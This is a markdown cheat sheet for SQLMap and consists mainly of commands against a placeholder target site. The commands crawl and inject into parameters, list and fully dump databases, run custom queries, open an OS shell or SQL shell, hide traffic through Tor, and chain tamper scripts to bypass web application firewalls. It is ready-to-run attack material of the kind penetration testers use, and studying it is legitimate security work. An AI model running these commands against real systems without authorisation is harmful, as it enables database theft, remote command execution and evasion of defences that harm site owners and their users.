# SQLMap

## Simple Usage

### Blindly run SQLMap against the target site. 
"--crawl" will crawl and attack the site.
```
sqlmap -u "https://target_site.com/page/" --crawl=2
```

### Automatic GET request parameter
```
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2”
```

### Specify the GET request parameters to exploit
Specify the parameters you want to check with the "-p" flag and a comma separated list of params to check.
```
sqlmap -u “https://target_site.com/page?p1=value1&p2=value2” -p p1
```

### Use POST requests, testing all parameters. (Use -p flag to specify which ones to test)
```
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2"
```

### Use Burp Suite request file as input.
In Burp HTTP History, right-click and "Copy to File" a request. You can then specify the target parameter or allow SQLMap to automatically detect.
```
sqlmap -r request.txt
```

### Use Authenticated Session with Auth Headers
```
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --headers="Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l"
```

### Basic Authentication
```
sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password
```
### Use Previously Created Session as Input (-s)
If you've got a previous SQL injection true positive somewhere, then SQLMap will automatically create a session file (.sqlite) for later use. Now, if you want to try some other commands with that session later on, you can use the session file directly. This will save you time so you don't have to wait for SQLMap to refind the vuln. 
``` 
sqlmap -u “https://target_site.com/page?p1=value1" -s SESSION-FILE.sqlite --dbs
```

## Post Exploitation Commands
If the SQL Injection vulnerability is a true positive then you can use the following commands to exploit it.

### List the Databases
```
sqlmap -u “https://target_site.com/page?p1=value1” --dbs
```

### List Tables of Database TARGET_DB
```
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables
```

### List Columns of Table TARGET_TABLE of Database TARGET_DB
```
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns
```

### Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB
```
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C "Col1,Col2" --dump
```

### Fully Dump Table TARGET_TABLE of Database TARGET_DB
```
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump
```

### Dump full Database
```
sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump
```

### Custom SQL query
```
sqlmap -u “https://target_site.com/page?p1=value1” --sql-query "SELECT * FROM TARGET_DB;"
```

### Get OS Shell
```
sqlmap -u “https://target_site.com/page?p1=value1” --os-shell
```

### Get SQL Shell
```
sqlmap -u “https://target_site.com/page?p1=value1” --sqlmap-shell
```

## Proxying SQLMap

### Proxy Through BrupSuite
```
sqlmap -u “https://target_site.com/page?p1=value1” --proxy="http://127.0.0.1:8080/"
```

### Use Tor Socks5 Proxy
```
sqlmap -u “https://target_site.com/page?p1=value1” --tor --tor-type=SOCKS5 --check-tor --dbs
```

## Extras

### Specify the Database Type
You can use other DBMS types like MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, Percona, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, etc.
```
sqlmap -u “https://target_site.com/page?p1=value1” --dbms=mysql
```

### Attack Techniques
"--technique" specifies a letter of letters of the BEUSTQ to control the exploit attempts
* B - boolean based blind
* E - error based
* U - union query based
* S - stacked queries
* T - Time-based blind
* Q - Inline queries

```
sqlmap -u “https://target_site.com/page?p1=value1” --technique=BEUSTQ
```

### Specify the Injection Techniques
You can specify the difficulty levels using two flags. "--level" and "--risk"
```
sqlmap -u “https://target_site.com/page?p1=value1” --risk=3 --level=5
```
*Risk*
This option requires an argument that specifies the risk of tests to perform. There are three risk values:
* 1 - the default value. No need to specify
* 2 - Adds to the default risk set - heavy query time-based SQL injections
* 3 - Adds or-based SQL injection tests.

*Level*
This option requires an argument that specifies the additional parameters to test. There are five level values:
* 1 - GET + POST Parameters
* 2 - Add HTTP Cookies
* 3 - Add User-Agent / Referer
* 4 - Enables more payloads for certain techniques, not necessarily new parameters to test.
* 5 - Adds Host header and additonal payloads for certain techniques.

When increasing to Level 2 or above, consider how your authentication schema may be effected. If you have session tokens that need to be persistent then you'll want to bypass testing of certain cookies. 
```
sqlmap -u "https://target_site.com/page?p1-value" --level=2 --cookie="PHPSESSID=...." --param-exclude="PHPSESSID"
```

### Use Default Options for the Process
Use "--batch" flag to use all the default options to create a non-interactive session. (By specifying the batch flag, sqlmap will not ask you for the (Y/N) choices but instead will smartly choose according to the needs.)
```
sqlmap -u “https://target_site.com/page?p1=value1” --batch
```

### Force-SSL
If you are getting errors with connections (found while proxying through BurpSuite quite often) or are getting SSL connection errors then force an SSL connection.
```
sqlmap -u "https://target_site.com/page?p1=value" --force-ssl
```

### Tamper Scripts
Tamper scripts can be used to bypass WAF implementations or modify a payload. Multiple tamper scripts can be used at once by specifying them via a comma separated list.
```
sqlmap -u “https://target_site.com/page?p1=value1” --tamper=charencode
```
General Purpose Usecase:
```
--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MSSQL:
```
--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dsash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
MySQL:
```
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```



